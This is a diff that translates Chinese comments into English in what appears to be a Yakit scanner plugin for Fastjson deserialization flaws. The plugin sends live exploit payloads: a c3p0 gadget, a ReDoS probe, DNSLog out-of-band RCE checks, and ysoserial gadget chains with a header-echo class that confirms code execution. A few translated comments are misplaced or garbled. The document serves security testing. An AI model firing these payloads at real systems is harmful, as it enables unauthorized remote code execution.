@@ -1,8 +1,8 @@
-// 插件配置
+// plug-in configuration
 dnslogTimeout = 3
-timeoutTolerance = 2 // 2 秒的超时容错
+timeoutTolerance = 2 // 2 seconds timeout tolerance
 fuzzTimeout = 10
-networkFluctuation = 5 // 网络波动，fuzztimeout = networkFluctuation * getCommonWastTime()
+networkFluctuation = 5 // Network fluctuation, fuzztimeout = networkFluctuation * getCommonWastTime()
 log.setLevel("info")
 
 encodePayload = payload=>{
@@ -14,31 +14,31 @@ encodePayload = payload=>{
 }
 
 logIsFastjsonInfo = b =>{
-    info = "不支持的fastjson flag"
+    info = "Unsupported fastjson flag"
     switch b{
         case 0:
-            info = "无法判断目标 json 框架类型"
+            info = "Unable to determine the target json frame type"
         case 1:
-            info = "目标疑似使用 fastjson 框架"
+            info = "target is suspected of using the fastjson framework."
         case -1:
-            info = "目标疑似使用 jaskon 框架"
+            info = "The target is suspected to use the jaskon framework"
     }
     yakit.Info(info)
 }
 
 logVersionScope = scope =>{
     if len(scope) == 0{
-        yakit.Info("目标json框架版本检测失败")
+        yakit.Info("Target json framework version detection failed")
         return
     }
     if scope[0] == scope[1]{
-        yakit.Info("目标json框架版本是 [%s]" % scope[0])
+        yakit.Info("The target json framework version is [%s]" % scope[0])
     }else{
-        yakit.Info("目标json框架版本范围是 [%s - %s]" % scope)
+        yakit.Info("The target json framework version range is [ %s - %s]" % scope)
     }
 }
 
-versionCompare = (s1,s2)=>{ //版本比较，只适用类似这种的版本号比较：1.1.1
+versionCompare = (s1,s2)=>{ //. Version comparison only applies to version number comparisons like this: 1.1.1
     v1 = str.Split(s1,".")
     v2 = str.Split(s2,".")
     if len(v1) == 3 && len(v2) == 3{
@@ -54,7 +54,7 @@ versionCompare = (s1,s2)=>{ //版本比较，只适用类似这种的版本号�
     }
     return 0,true
 }
-versionInScope = (scope1,scope2)=>{ // 判断 scope2 和 scope1 是否有交集
+versionInScope = (scope1,scope2)=>{ // Determine whether scope2 and scope1 Intersection
     if len(scope1) != 2 || len(scope2) != 2{
         return false
     }
@@ -71,14 +71,14 @@ versionInScope = (scope1,scope2)=>{ // 判断 scope2 和 scope1 是否有交集
     }
     return inScope(scope2[0]) || inScope(scope2[0])
 }
-solution = `1. 升级Fastjson版本：如果你的项目中使用了Fastjson，请确保使用的是1.2.80版本或以上。Fastjson团队已经在1.2.80版本中修复了反序列化漏洞以及其他安全问题，因此升级到较新版本是解决漏洞的最佳方法。
+solution = `1. Upgrade the Fastjson version: If Fastjson is used in your project, please make sure you are using version 1.2.80 or above. The Fastjson team has fixed the deserialization vulnerability and other security issues in version 1.2.80, so upgrading to a newer version is the best way to resolve the vulnerability.
 
-2. 避免使用AutoType特性：Fastjson的AutoType功能是导致反序列化漏洞的一个重要因素。该功能可以在一定程度上增强反序列化能力，但也容易被恶意利用。在实际使用中，尽量避免开启AutoType功能，可以通过设置ParserConfig的autoTypeSupport属性为false来关闭该功能。这样做会限制某些复杂类型的反序列化能力，但可以提高安全性。
+2. Avoid using the AutoType feature: Fastjsons AutoType feature is an important factor leading to deserialization vulnerabilities. This feature can enhance deserialization capabilities to a certain extent, but it is also easily exploited by malicious actors. In actual use, try to avoid turning on the AutoType function. You can turn off this function by setting the autoTypeSupport attribute of ParserConfig to false. Doing so limits the ability to deserialize certain complex types, but improves security. The
 
-3. 审查输入数据：在处理JSON字符串时，对于从不可信来源（如网络、用户输入等）获取的数据，应进行充分的验证和过滤。确保只有受信任的数据被传递给Fastjson进行反序列化操作。`
-description = `Fastjson反序列化漏洞是一种远程代码执行漏洞，攻击者可以通过构造恶意JSON字符串触发漏洞，进而执行任意代码。该漏洞存在的原因是Fastjson在处理某些特定的JSON字符串时没有正确地检查反序列化的数据，导致攻击者可以在JSON中植入恶意代码。`
+3. Review input data: When processing JSON strings, data obtained from untrusted sources (such as the network, user input, etc.) should be fully validated and filtered. Ensure that only trusted data is passed to Fastjson for deserialization operations. `
+description = `Fastjson deserialization vulnerability is A remote code execution vulnerability that allows an attacker to trigger the vulnerability by constructing a malicious JSON string and execute arbitrary code. The vulnerability exists because Fastjson does not properly check the deserialized data when processing certain JSON strings, allowing attackers to plant malicious code in JSON. `
 
-// json为空时会误判
+// When json is empty,
 isJson = d =>{
     try{
         return len(json.loads(d)) > 0
@@ -98,7 +98,7 @@ expMap = {
     "exp_c3p0":[`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"{{randstr(2)}}":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:{{params(payload)}};"}}`]
 }
 poc_redos = `{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaaaaaaa!"}`
-# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调
+# mirrorNewWebsitePath Every time a new website path appears, the first request for this website path will be processed here. Incoming callback
 mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
     originBody = body
     originReq = req
@@ -115,12 +115,12 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         if ok {
             v.createRisk()
         }
-        yakit.Info("Fastjson 综合检测插件执行结束")
+        yakit.Info("Fastjson comprehensive detection plug-in execution ends")
     }
     getCommonWastTime = ()=>{
         v,ok = globalInfo.Load("wastTimes")
         if !ok{
-            return -1 // 当获取commonTime失败时不进行超时检查
+            return -1 // No timeout check is performed when obtaining commonTime fails
         }else{
             i = 0
             for t in v{
@@ -130,13 +130,13 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         }
     }
     newRisk = (title,payload,param,levelIndex)=>{
-        yakit.Info("发现漏洞风险: %v", title)
+        yakit.Info("Vulnerability risk found: %v", title)
         log.debug("response: %v", string(param.rsp.ResponseRaw))
         globalInfo.Store("isFastjson",1)
         titleVerbose = title
         version,ok=globalInfo.Load("versionScope")
         if ok && (version[0] != "0.0.0" || version[1] != "999.999.999"){
-            title += " 版本 [%v-%v]"%version
+            title += " version [%v-%v]"%version
         }
         v,ok=globalInfo.Load("risk")
         levelFlag = ["low","middle","critical"]
@@ -144,7 +144,7 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         RequestRaw = rsp.RequestRaw
         ResponseRaw =rsp.ResponseRaw
         name = param.param.name
-        if !ok || levelIndex >= v.level { // 当风险等级大于等于上一个risk时更新risk
+        if !ok || levelIndex >= v.level { // Update the risk when the risk level is greater than or equal to the previous risk
             globalInfo.Store("risk",{"level":levelIndex,"createRisk":()=>{
                 risk.NewRisk(url,
                     risk.title(title),
@@ -164,28 +164,28 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
     isFastjson = (fuzzParam)=>{
         paramInfo = fuzzParam.param
         isFastjsonParam = 0
-        if isJson(paramInfo.value){ // 当响应包为json时尝试通过添加字段判断jackson
+        if isJson(paramInfo.value){ // When the response packet is json, try to judge jackson by adding fields
             hasError = s =>{
                 s = string(s)
-                log.debug("检测异常响应: %v", s)
+                log.debug("detection Abnormal response: %v", s)
                 return re.Match("false|500|error|(Internal Server Error)|(Unrecognized field)", s)
             }
             commonHasError = hasError(originBody)
-            log.debug("常规请求 body has error: %v",commonHasError)
+            log.debug("Regular request body has error : %v",commonHasError)
             data = json.loads(paramInfo.value)
             data[randstr(5)] = randstr(5)
             dataStr = json.dumps(data)
-            log.debug("检查 jackson payload: %v", dataStr)
+            log.debug("Check jackson payload: %v", dataStr)
             rsp,err = fuzzParam.fuzz(dataStr)
             if err {
-                yakit.Error("发送 request error: %v", err)
+                yakit.Error("Send request error: %v", err)
                 return
             }
             body = getBody(rsp.ResponseRaw)
-            log.debug("检查 jackson 请求 body: %v",string(body))
-            log.debug("检查 jackson 请求 body has error: %v",hasError(string(body)))
-            // if !commonHasError && hasError(string(body)) || (string(body) != paramInfo.value) { // 由于添加字段导致出现错误或和原本响应包内容发生不同则判断为jackson
-            if !commonHasError && hasError(string(body)) { // 由于添加字段导致出现错误或则判断为jackson
+            log.debug("Check jackson request body: %v",string(body))
+            log.debug("Check jackson request body has error: %v",hasError(string(body)))
+            // if !commonHasError && hasError(string(body)) || (string(body) != paramInfo.value) { // Due to added fields If it causes an error or is different from the original response packet content, it is judged to be jackson.
+            if !commonHasError && hasError(string(body)) { // An error occurs due to adding fields or it is judged to be jackson
                 isFastjsonParam = -1
             }
         }
@@ -204,7 +204,7 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                 version = version[0]
                 scope = [version,version]
                 globalInfo.Store("isFastjson",1)
-                newRisk("目标存在 fastjson 框架 (Version Check)","",param,0)
+                newRisk("The target has a fastjson framework (Version Check)","",param,0)
             }
         }
         globalInfo.Store("versionScope",scope)
@@ -229,23 +229,23 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
             if ok {
                 if res != 1{ // versionScope[1] <= v
                     varName = "exp_"+str.Join(str.Split(v,"."), "")
-                    log.debug("添加payload: %v", varName)
+                    log.debug("Add payload: %v", varName)
                     exps.Append(expMap.$varName)
                 }else{ // versionScope[1] > v
                     exps.Append(expMap.exp_1243)
                     exps.Append(expMap.exp_1268)
                     exps.Append(expMap.exp_1283)
-                    log.debug("添加payload: exp_1243")
-                    log.debug("添加payload: exp_1268")
-                    log.debug("添加payload: exp_1283")
+                    log.debug("Add payload: exp_1243")
+                    log.debug("Add payload: exp_1268")
+                    log.debug("add payload: exp_1283")
                 }
             }
 
             if len(exps)>0{
                 checkDns = true
                 domain,token,err = risk.NewDNSLogDomain()
-                if err{ // 如果获取dnslog失败则尝试使用错误的地址延迟测试
-                    yakit.Error("生成 dnslog error: %v", err)
+                if err{ // If obtaining dnslog fails, try to use the wrong address to delay the test
+                    yakit.Error("generates dnslog error: %v", err)
                     checkDns = false
                     domain = "123.123.123.123"
                 }
@@ -266,9 +266,9 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                     if checkDns{
                         res,err = risk.CheckDNSLogByToken(token,dnslogTimeout)
                         if err{
-                            // dnslog查询失败
+                            // dnslog query failure
                         }else{
-                            if len(res) > 0{ // dnslog查询检测成功
+                            if len(res) > 0{ // dnslog query detection is successful
                                 globalInfo.Store("outNet",1)
                                 for info in res{
                                     if str.HasPrefix(str.ToLower(info["Domain"]),str.ToLower(dnslog1Prefix)){
@@ -278,16 +278,16 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                                         globalInfo.Store("versionScope",["1.2.83","1.2.83"])
                                     }
                                 }
-                                newRisk("目标 fastjson 框架可能存在 RCE 漏洞 (DNSLog Check)",exp,param,2)
+                                newRisk("The target fastjson framework may have an RCE vulnerability (DNSLog Check)",exp,param,2)
                                 break
                             }
                         }
                     }
-                    log.debug("当前请求时长: %v", wastTime)
-                    log.debug("常规请求时长: %v", getCommonWastTime())
-                    log.debug("当前超时容错值: %v", timeoutTolerance)
-                    if wastTime - getCommonWastTime() > timeoutTolerance{ // 如果dnslog查询失败会进行延时检测
-                        newRisk("目标 fastjson 框架可能存在 RCE 漏洞 (Delay Check)",exp,param,2)
+                    log.debug("Current request duration: %v", wastTime)
+                    log.debug("regular request duration: %v", getCommonWastTime())
+                    log.debug("Current timeout tolerance value: %v", timeoutTolerance)
+                    if wastTime - getCommonWastTime() > timeoutTolerance{ // If dnslog query fails, delay detection will be performed
+                        newRisk("The target fastjson framework may have an RCE vulnerability (Delay Check)",exp,param,2)
                         break
                     }
                 }
@@ -299,20 +299,20 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
     reqIsJson = str.MatchAllOfRegexp(string(req), `(?i)Content-Type: (.*?)json`)
     rspIsJson = str.MatchAllOfRegexp(string(rsp), `(?i)Content-Type: (.*?)json`)
     if reqIsJson{
-        log.debug("请求包body存在json")
+        log.debug("Request package body exists in json")
     }
     if rspIsJson{
-        log.debug("响应包body存在json")
+        log.debug("response package body exists json")
     }
-    if !reqIsJson && !rspIsJson { // 请求包或响应包的Content-Type不包含json则检查queryParam、cookieParam、postParam中的json
+    if !reqIsJson && !rspIsJson { // . If the Content-Type of the request packet or response packet does not contain json, check the json in queryParam, cookieParam, and postParam.
         allParams = freq.GetPostParams()
         allParams.Append(freq.GetGetQueryParams()...)
         allParams.Append(freq.GetCookieParams()...)
         for param in allParams{
             p = param
             value = p.Value()
-            log.debug("检测参数 `%v:%v` 是否为json", p.Name(),value)
-            if typeof(value).String() == "[]string"{ // 处理数组参数
+            log.debug("Check whether the parameter `%v:%v` is json", p.Name(),value)
+            if typeof(value).String() == "[]string"{ // handles the array parameters.
                 if len(value) > 0{
                     value = value[0]
                 }else{
@@ -320,7 +320,7 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                 }
             }
             if isJson(value){
-                log.debug("发现位于 %v 的 json 参数 `%v:%v`", p.Position(),p.Name(),value)
+                log.debug("Found the json parameter `%v:%v` located in %v", p.Position(),p.Name(),value)
                 needToFuzzParams.Append({"value":value,"fuzz":(payload)=>{
                     return p.Fuzz(payload)
                 },"name":p.name(),"rsp":originRsp})
@@ -350,24 +350,24 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
             return rsp,err
         }
         newParam["delayFuzz"] = delayFuzz
-        newParam["fuzz"] = payload=>{ // 每次常规请求会计入平均请求时长
+        newParam["fuzz"] = payload=>{ // Each regular request will be included in the average Request duration
             rsp,err = delayFuzz(payload)
             wastTime = rsp.DurationMs/1000.0
             v,ok = globalInfo.Load("wastTimes")
             commonWastTime = getCommonWastTime()
-            if commonWastTime != -1{ // 调整网络波动，根据网络波动可以计算出超时时长
-                wastTimeRound = math.Round(wastTime) // 以秒为单位，减小误差
+            if commonWastTime != -1{ // adjusts network fluctuations, and the timeout length can be calculated based on network fluctuations
+                wastTimeRound = math.Round(wastTime) // in seconds, reduce the error
                 commonWastTimeRound = math.Round(commonWastTime)
-                if !(wastTimeRound == 0 || commonWastTimeRound == 0){ // 超过1秒才有调整的必要
+                if !(wastTimeRound == 0 || commonWastTimeRound == 0){ // It is necessary to adjust if it exceeds 1 second.
                     networkFluctuation_bak = networkFluctuation
-                    tt = len(v)/10.0 // 调整系数，统计次数越多，系数越大，最大为1
+                    tt = len(v)/10.0 // adjustment coefficient, the more statistics, the greater the coefficient, the maximum is 1
                     if tt > 1{
                         tt = 1
                     }
                     fluctuation = math.Abs(wastTimeRound-commonWastTimeRound)*1.0/commonWastTimeRound
                     fluctuation = math.Ceil(fluctuation)
-                    networkFluctuation = networkFluctuation - (networkFluctuation - fluctuation)*tt // 每次调整幅度要乘以调整系数
-                    log.debug("调整网络波动: `%f` -> `%f`" %[networkFluctuation_bak,networkFluctuation])
+                    networkFluctuation = networkFluctuation - (networkFluctuation - fluctuation)*tt // Each adjustment range must be multiplied by the adjustment coefficient
+                    log.debug("Adjust network fluctuations : `%f` -> `%f`" %[networkFluctuation_bak,networkFluctuation])
                 }
             }
             if !ok{
@@ -376,7 +376,7 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                 v = append(v,wastTime)
             }
             if getCommonWastTime() != -1{
-                fuzzTimeout = math.Ceil(getCommonWastTime()) * networkFluctuation // 根据网络波动调整超时时间
+                fuzzTimeout = math.Ceil(getCommonWastTime()) * networkFluctuation // Adjust the timeout according to network fluctuations
             }
             globalInfo.Store("wastTimes",v)
             return rsp,err
@@ -389,31 +389,31 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
     }
     fuzzParam = needToFuzzParams[0]
 
-    // 报错检测
+    // Error detection
     fastjsonCheck = isFastjson(fuzzParam)
     logIsFastjsonInfo(fastjsonCheck)
-    if fastjsonCheck != -1{ // 不是jackson框架就继续检测
-        log.debug("目标使用非jackson框架")
+    if fastjsonCheck != -1{ // . If it is not the jackson framework, continue to detect
+        log.debug("The target uses a non-jackson framework")
         versionScope = checkFastjsonVersion(fuzzParam)
         logVersionScope(versionScope)
-        log.debug("开始EXP检测")
+        log.debug("Start EXP to detect")
         for param in needToFuzzParams{
-            checkPayloadsByVersionScope(param) // 根据版本fuzz
+            checkPayloadsByVersionScope(param) // depends on the version fuzz
             if hasCriticalRisk(){
                 break
             }
         }
-        // 上一个步骤已经可以得知出网信息、常规请求时长信息
-        // 反连检测（这个步骤可以获取比较准确的出网情况）
+        // The previous step can already know the outgoing network information and regular request duration information
+        // Reverse connection detection (this step can obtain a more accurate outgoing network situation)
         v, ok = globalInfo.Load("isFastjson")
         if (!ok || ok && v!=-1) && !hasCriticalRisk(){
-            log.debug("开始出网检测")
+            log.debug("Start outgoing network detection")
             for param in needToFuzzParams{
                 for poc in dnslogPocs{
                     checkDns = true
                     domain,token,err = risk.NewDNSLogDomain()
-                    if err{ // 如果获取dnslog失败则尝试使用错误的地址延迟测试
-                        yakit.Error("生成 dnslog error: %v", err)
+                    if err{ // If obtaining dnslog fails, try to use the wrong address to delay the test
+                        yakit.Error("generates dnslog error: %v", err)
                         checkDns = false
                         domain = x"{{randstr}}.{{randstr}}.com"
                     }
@@ -428,13 +428,13 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                         die(err)
                         if len(res)>0{
                             globalInfo.Store("outNet",1)
-                            newRisk("目标 fastjson 框架存在 dnslog 回显",poc,param,0)
+                            newRisk("Target fastjson framework exists dnslog echo",poc,param,0)
                             break
                         }
                     }
                     wastTime = rsp.DurationMs/1000.0
-                    if wastTime - getCommonWastTime() > timeoutTolerance{ // 如果dnslog查询失败会进行延时检测
-                        newRisk("目标 fastjson 框架可能存在漏洞 (Delay Check)",poc,param,0)
+                    if wastTime - getCommonWastTime() > timeoutTolerance{ // If dnslog query fails, delay detection will be performed
+                        newRisk("The target fastjson framework may have a vulnerability (Delay Check)",poc,param,0)
                         break
                     }
                 }
@@ -442,15 +442,15 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
         }
 
         /*
-            下一个不出网检测需要爆破利用链，payload较多，这里再确认下目标是fastjson，不能确认就结束检测
+            will be misjudged. The next non-outline detection requires blasting the exploit chain, which has a lot of payloads. Here we will discuss it again. Confirm that the target is fastjson. If it cannot be confirmed, end the detection of
         */
-        // fastjson特征检测（dos延时、读文件等操作）
+        // fastjson feature detection (dos delay, file reading, etc.)
         if !hasCriticalRisk() && globalInfo.Load("isFastjson")[0] != 1{
-            log.debug("开始fastjson特征检测")
-            // redos 检测 适用于 1.2.36 - 1.2.62
+            log.debug("Start fastjson feature detection")
+            // redos detection is applicable to 1.2.36 - 1.2.62
             scope,ok = globalInfo.Load("versionScope")
             if ok && versionInScope(scope,["1.2.36","1.2.6"]) {
-                log.debug("redos 特征检测")
+                log.debug("redos feature detection")
                 for param in needToFuzzParams{
                     fuzzOk = true
                     for in 3{
@@ -459,29 +459,29 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                             fuzzOk = false
                             break
                         }else{
-                            log.info("发现redos漏洞")
+                            log.info(". Discover redos vulnerability")
                         }
                     }
                     if fuzzOk {
-                        newRisk("目标存在 fastjson 框架 (Redos Check)","",param,0)
+                        newRisk("target exists fastjson framework (Redos Check)","",param,0)
                         break
                     }
                 }
             }
         }
 
-        // 不出网检测 （这里发包会比较多，需要确保目标是fastjson）
+        // does not go out of the network detection (there will be more packets here, you need to ensure that the target is fastjson)
         v,ok = globalInfo.Load("outNet")
         isFastjson,ok = globalInfo.Load("isFastjson")
         if (!ok || ok && v != 1) && !hasCriticalRisk() && isFastjson == 1 {
-            log.debug("开始回显检测")
+            log.debug("Start echo detection")
             key = randstr(5)
             val = randstr(5)
             gadgets = yso.GetAllTemplatesGadget()
             for gadgetGen in gadgets{
                 gadget,err = gadgetGen(yso.useHeaderEchoEvilClass(),yso.springHeader(key,val))
                 if err{
-                    yakit.Error("生成 header echo payload error: %v", err)
+                    yakit.Error("generates header echo payload error: %v", err)
                 }
                 byts = yso.ToBytes(gadget)~
                 payload = codec.EncodeToHex(byts)~
@@ -498,14 +498,14 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
                     req = poc.AppendHTTPPacketHeader(originReq, "Accept-Language","zh-CN,zh;q=1.9")
                     freq,err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
                     if err != nil{
-                        yakit.Error("生成 fuzz request 错误: %v", err)
+                        yakit.Error("Generate fuzz request error: %v", err)
                     }
                     rsp,err = freq.FuzzPostRaw(payload).ExecFirst()
                     if err != nil{
                         continue
                     }
                     if poc.GetHTTPPacketHeader(rsp.ResponseRaw, key) == val{
-                        newRisk("目标 fastjson 框架存在 RCE 漏洞, 成功执行回显代码",payload,param,2)
+                        newRisk("Target fastjson framework There is an RCE vulnerability, and the echo code is successfully executed.",payload,param,2)
                     }
                 }
             }
